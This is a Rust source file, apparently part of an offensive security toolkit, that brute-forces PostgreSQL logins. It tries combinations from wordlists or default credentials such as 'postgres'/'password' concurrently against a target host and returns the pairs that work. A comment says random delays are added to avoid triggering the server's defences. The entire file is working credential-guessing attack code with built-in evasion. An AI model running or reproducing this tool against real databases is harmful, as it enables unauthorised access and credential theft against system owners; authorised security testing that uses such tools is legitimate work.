use crate::handler::brute::{BruteForceResult, BruteForceTask, Protocol, TaskStatus, BruteForceManager};
use std::sync::Arc;
use tokio::sync::{Mutex, Semaphore};
use std::time::{Duration, Instant};
use futures::future::join_all;
use rand::Rng;
use tokio_postgres::{Config, NoTls, Error};

// PostgreSQL暴力破解功能
pub async fn postgresql_brute_force(
    task: BruteForceTask,
    manager_state: Arc<Mutex<BruteForceManager>>
) -> Vec<BruteForceResult> {
    let target = task.target.clone();
    let port = if task.port == 0 { 5432 } else { task.port }; // 默认PostgreSQL端口5432
    let task_id = task.id.unwrap_or(0);
    let num_threads = task.threads.max(1) as usize;
    
    // 获取用户名和密码列表
    let usernames = match (task.usernames.clone(), task.username_file.clone()) {
        (Some(names), _) if !names.is_empty() => names,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["postgres".to_string(), "admin".to_string()],
    };

    let passwords = match (task.passwords.clone(), task.password_file.clone()) {
        (Some(pwds), _) if !pwds.is_empty() => pwds,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["".to_string(), "postgres".to_string(), "password".to_string(), "admin".to_string()],
    };

    if usernames.is_empty() || passwords.is_empty() {
        return Vec::new();
    }

    let semaphore = Arc::new(Semaphore::new(num_threads));
    let mut spawned_tasks = Vec::new();

    'outer: for username in usernames {
        for password in &passwords {
            // 检查任务是否已从外部停止
            {
                let guard = manager_state.lock().await;
                if let Some(current_task_in_manager) = guard.tasks.iter().find(|t| t.id == Some(task_id)) {
                    if current_task_in_manager.status == TaskStatus::Stopped {
                        break 'outer;
                    }
                } else {
                    break 'outer;
                }
            }

            let permit = match semaphore.clone().acquire_owned().await {
                Ok(p) => p,
                Err(_) => break 'outer,
            };

            let t_target = target.clone();
            let t_port = port;
            let t_username = username.clone();
            let t_password = password.clone();
            let t_timeout_secs = task.timeout;
            let t_task_id = task_id;
            let t_protocol_clone = task.protocol.clone();
            
            // 增加随机延迟以避免触发服务器防御机制
            let delay_ms = rand::thread_rng().gen_range(10..100);
            tokio::time::sleep(Duration::from_millis(delay_ms)).await;

            spawned_tasks.push(tokio::spawn(async move {
                let start_time = Instant::now();
                
                // PostgreSQL连接尝试
                let result = try_postgresql_login(&t_target, t_port, &t_username, &t_password, t_timeout_secs).await;
                let duration = start_time.elapsed().as_millis() as u64;
                drop(permit);
                
                match result {
                    Ok(_) => {
                        // 登录成功
                        Some(BruteForceResult {
                            task_id: t_task_id,
                            target: t_target,
                            protocol: t_protocol_clone,
                            username: t_username,
                            password: t_password,
                            success: true,
                            time_taken: duration,
                            error: None,
                        })
                    },
                    Err(_) => None, // 不返回失败结果
                }
            }));
        }
    }

    let mut results = Vec::new();
    for task_handle in join_all(spawned_tasks).await {
        match task_handle {
            Ok(Some(result)) => {
                results.push(result);
            }
            Ok(None) => {
                // 登录尝试失败，不做任何操作
            }
            Err(e) => {
                eprintln!("PostgreSQL brute force task panicked: {}", e);
            }
        }
    }

    results
}

// 尝试PostgreSQL登录
async fn try_postgresql_login(host: &str, port: u16, username: &str, password: &str, timeout_secs: u64) -> Result<(), String> {
    // 配置PostgreSQL连接
    let mut config = Config::new();
    config.host(host);
    config.port(port);
    config.user(username);
    config.password(password);
    config.connect_timeout(Duration::from_secs(timeout_secs));
    
    // 尝试连接（默认尝试postgres数据库）
    config.dbname("postgres");
    
    // 尝试建立连接并验证凭据
    match config.connect(NoTls).await {
        Ok(_conn) => {
            // 连接成功，登录成功
            Ok(())
        },
        Err(e) => {
            // 检查错误类型，如果是凭据错误，则返回相应错误
            if let Some(db_error) = e.as_db_error() {
                if db_error.code().code() == "28P01" {  // 无效的密码错误代码
                    return Err("Invalid password".to_string());
                }
            }
            Err(format!("PostgreSQL connection failed: {}", e))
        }
    }
} 